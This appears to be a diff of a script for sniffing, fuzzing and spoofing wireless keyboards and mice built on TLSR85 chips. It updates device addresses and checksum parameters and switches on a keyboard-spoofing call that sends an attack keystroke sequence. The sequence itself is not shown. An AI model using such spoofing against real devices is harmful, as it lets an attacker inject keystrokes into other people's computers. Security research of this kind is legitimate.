@@ -52,17 +52,17 @@ common.parse_and_init()
 ----------------------------Initial analysis----------------------------
 """
 
-#Device.quick_sniff("3d:99:52:9c:11", [2, 6, 14, 18, 22, 30, 34, 38, 42, 46, 50, 54, 62, 66, 68, 70, 78, 80, 82, 10, 26, 72, 74], common.RF_RATE_2M, 30)
-#Device.fuzz_channels("55:79:90:16", common.RF_RATE_1M)
+#Device.quick_sniff("4a:b4:cb:dc:b9", [5, 11, 17, 51, 57, 63, 69, 75], common.RF_RATE_2M, 30)
+#Device.fuzz_channels("4a:b4:cb:80", common.RF_RATE_2M)
 
 
 """
 ----------------------------TLSR85----------------------------
 """
 
-trust_keyboard = Tlsr85_Keyboard("4a:b4:cb:80", "aa:aa:b5", 0x11021, 0x24bf)
-#poss_keyboard = Tlsr85_Keyboard("d5:54:cb:80", "aa:aa:cc", 0x11021, 0xcb01)
-trust_mouse = Tlsr85_Mouse("4a:b4:cb:dc", "aa:aa:aa:b5", 0x11021, 0x24bf)
+trust_keyboard = Tlsr85_Keyboard("b5:4a:b4:cb:80", 0x11021, 0xEFDF)
+#poss_keyboard = Tlsr85_Keyboard("cc:d5:54:cb:80", 0x11021, 0xEFDF)
+trust_mouse = Tlsr85_Mouse("b5:4a:b4:cb:dc", 0x11021, 0xEFDF)
 
 
 attack_tlsr85_keyboard = [
@@ -78,7 +78,7 @@ attack_tlsr85_keyboard = [
 
 #trust_keyboard.sniff()
 #trust_mouse.sniff()
-#trust_keyboard.spoof(attack_tlsr85_keyboard)
+trust_keyboard.spoof(attack_tlsr85_keyboard)
 
 
 
@@ -103,7 +103,7 @@ attack_tx_keyboard = [
 attack_tx_mouse = tx_mouse.build_packet([MouseClickType.LEFT_CLICK], x_move="8888")
 
 #tx_mouse.sniff()
-tx_keyboard.spoof(attack_tx_keyboard)
+#tx_keyboard.spoof(attack_tx_keyboard)
 #tx_mouse.spoof(attack_tx_mouse)
 
 
